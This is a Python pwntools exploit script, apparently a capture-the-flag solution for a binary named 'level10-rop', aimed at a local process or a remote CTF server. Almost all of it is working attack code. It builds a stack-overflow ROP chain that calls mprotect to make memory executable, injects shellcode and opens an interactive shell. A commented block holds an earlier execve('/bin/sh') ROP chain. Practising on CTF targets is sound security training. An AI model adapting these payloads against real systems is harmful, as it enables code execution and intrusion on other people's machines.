#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./level10-rop"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team",22010)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.add)
    pause()

say1= r.recv()
''' construct a shellcode
stack_pos =0xffffd40c
int_80 =0x08048126#0x8048137

pop_eax = 0x804819C
pop_ebx = 0x804819E
pop_ecx = 0x80481A0
pop_edx = 0x80481A2

r1 = 0#0x68
r2 = 0x0068732f #0x68732f2f #0x732f2f2f
r3 = 0x6e69622f #0x6e69622f
r4 = 0 #0x1010101
r5 = stack_pos + 4*11

eax_val = 0xb
edx_val = 0#stack_pos + 4*10 #0x0
ebx_val = stack_pos + 4*11
ecx_val = stack_pos + 4*9

payload = 'a' * 0x30 #+ 'a'*0x4
payload += p32(pop_eax) + p32(eax_val)
payload += p32(pop_ebx) + p32(ebx_val)
payload += p32(pop_ecx) + p32(ecx_val)
payload += p32(pop_edx) + p32(edx_val)
payload += p32(int_80)
payload += p32(r5)
payload += p32(r4)
payload += p32(r3)
payload += p32(r2)
payload += p32(r1)
'''
inject_addr = 0x8048000

start_func = 0x804813A
read_sth = 0x80480FD

pop_eax = 0x804819C
pop_ebx = 0x804819E
pop_ecx = 0x80481A0
pop_edx = 0x80481A2

eax_val = 0x7d #125
ebx_val = inject_addr
ecx_val = 0x1000
edx_val = 7
int_80 = 0x80481a4 #0x08048126


run_addr = inject_addr + 0x500
sh = asm(shellcraft.sh())

payload_m = 'a'*0x30
payload_m += p32(pop_eax) + p32(eax_val)
payload_m += p32(pop_ebx) + p32(ebx_val)
payload_m += p32(pop_ecx) + p32(ecx_val)
payload_m += p32(pop_edx) + p32(edx_val)
payload_m += p32(int_80)  + p32(read_sth) + p32(run_addr) + p32(0) + p32(run_addr) +p32(0x80)


r.sendline(payload_m)
r.recv()
r.sendline(sh)#+'a'*(0x80-len(sh)))


payload_test = 'a'*0x30+p32(0x08048115) +p32(0)+ p32(1) + p32(0xffffd42c) +p32(4)
#print shellcraft.sh()
#ir.sendline(payload_test)
#r.recv()
#r.recv(0xb)
#r.recv()
r.interactive()
